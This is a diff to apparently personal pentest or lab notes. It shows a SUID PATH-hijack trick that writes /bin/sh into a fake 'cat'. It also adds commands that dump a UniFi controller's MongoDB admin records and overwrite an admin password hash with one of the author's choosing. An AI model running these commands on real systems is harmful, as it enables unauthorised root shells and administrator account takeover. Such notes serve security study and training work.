@@ -18,3 +18,17 @@ it has SUID set.
 chmod +x cat
 export PATH=/tmp:$PATH
 echo "/bin/sh" > cat
+
+//UNIFI MONGODB
+ps aux | grep mongo
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+
+crete password
+mkpasswd -m sha-512 Password1234
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$pgNniKC2xeXtTtRl$KqIpqj6FI8DGb9dXgc7vUCAeGuCWI3rCzKsopTZU5ncfE1F6XjEf.Faq/AecBR7x/ToDPw7bYrVth3kU3WkzS0"}})'
+
+
+
+
+
+
